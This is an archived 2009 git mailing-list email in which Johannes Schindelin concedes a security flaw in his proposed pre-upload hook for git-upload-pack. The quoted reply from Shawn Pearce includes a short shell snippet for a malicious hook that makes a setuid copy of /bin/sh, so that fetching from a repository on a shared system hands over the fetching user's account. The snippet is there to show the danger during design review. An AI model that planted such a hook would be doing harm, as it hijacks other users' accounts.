From: Johannes Schindelin <Johannes.Schindelin@gmx.de>
Subject: Re: Can I prevent someone clone my git repository?
Date: Thu, 8 Jan 2009 17:06:02 +0100 (CET)
Message-ID: <alpine.DEB.1.00.0901081704380.30769@pacific.mpi-cbg.de>
References: <856bfe0e0901072303i4fcd3bf6u99790ab9f4170937@mail.gmail.com> <7vr63e42ke.fsf@gitster.siamese.dyndns.org> <alpine.DEB.1.00.0901081227170.30769@pacific.mpi-cbg.de> <20090108143257.GX21154@genesis.frugalware.org> <alpine.DEB.1.00.0901081541041.30769@pacific.mpi-cbg.de>
 <20090108152934.GA16840@spearce.org> <alpine.DEB.1.00.0901081648550.30769@pacific.mpi-cbg.de> <20090108155622.GC16840@spearce.org>
Mime-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII
Cc: Miklos Vajna <vmiklos@frugalware.org>,
	Junio C Hamano <gitster@pobox.com>,
	Emily Ren <lingyan.ren@gmail.com>, git@vger.kernel.org
To: "Shawn O. Pearce" <spearce@spearce.org>
X-From: git-owner@vger.kernel.org Thu Jan 08 17:07:00 2009
Return-path: <git-owner@vger.kernel.org>
Envelope-to: gcvg-git-2@gmane.org
Received: from vger.kernel.org ([209.132.176.167])
	by lo.gmane.org with esmtp (Exim 4.50)
	id 1LKxPD-0005A0-B9
	for gcvg-git-2@gmane.org; Thu, 08 Jan 2009 17:06:47 +0100
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1752497AbZAHQFY (ORCPT <rfc822;gcvg-git-2@m.gmane.org>);
	Thu, 8 Jan 2009 11:05:24 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1752424AbZAHQFY
	(ORCPT <rfc822;git-outgoing>); Thu, 8 Jan 2009 11:05:24 -0500
Received: from mail.gmx.net ([213.165.64.20]:46414 "HELO mail.gmx.net"
	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with SMTP
	id S1752197AbZAHQFX (ORCPT <rfc822;git@vger.kernel.org>);
	Thu, 8 Jan 2009 11:05:23 -0500
Received: (qmail invoked by alias); 08 Jan 2009 16:05:21 -0000
Received: from pacific.mpi-cbg.de (EHLO pacific.mpi-cbg.de) [141.5.10.38]
  by mail.gmx.net (mp006) with SMTP; 08 Jan 2009 17:05:21 +0100
X-Authenticated: #1490710
X-Provags-ID: V01U2FsdGVkX1+Yyv4s1IWYwujx0JkTvMA6qSTijhFhbO0hozlCRx
	Tx1ub/RbZGFW7b
X-X-Sender: schindelin@pacific.mpi-cbg.de
In-Reply-To: <20090108155622.GC16840@spearce.org>
User-Agent: Alpine 1.00 (DEB 882 2007-12-20)
X-Y-GMX-Trusted: 0
X-FuHaFi: 0.6
Sender: git-owner@vger.kernel.org
Precedence: bulk
List-ID: <git.vger.kernel.org>
X-Mailing-List: git@vger.kernel.org
Archived-At: <http://permalink.gmane.org/gmane.comp.version-control.git/104931>

Hi,

On Thu, 8 Jan 2009, Shawn O. Pearce wrote:

> Johannes Schindelin <Johannes.Schindelin@gmx.de> wrote:
> > If you want it, here is an initial patch without tests.  Indeed, it 
> > has not been tested at all.
> > 
> > -- snipsnap --
> > [PATCH] Add a pre-upload hook to git-upload-pack
> 
> Of course what I love about this is that on a shared system someone can 
> take over your user account simply by putting a pre-upload hook into a 
> repository that you are likely to fetch from:
>  
> 	cat >.git/hooks/pre-upload
> 	#!/bin/sh
> 	cp /bin/sh /tmp/$USER.sh
> 	chmod u+s,a+x /tmp/$USER.sh
> 	^D
> 	chmod a+x .git/hooks/pre-upload
> 
> We just made what used to be a safe operation (fetch) dangerous.
> At least with push we've had hooks on the remote side for quite
> a while, and I think by now most people realize the dangers of
> pushing into a repository they share write access to.
> 
> Yikes.

Ouch.  You are correct, of course.  I missed the fact that this will not 
only be called from git daemon (which should run as nobody without any 
write access anyway).

Ciao,
Dscho
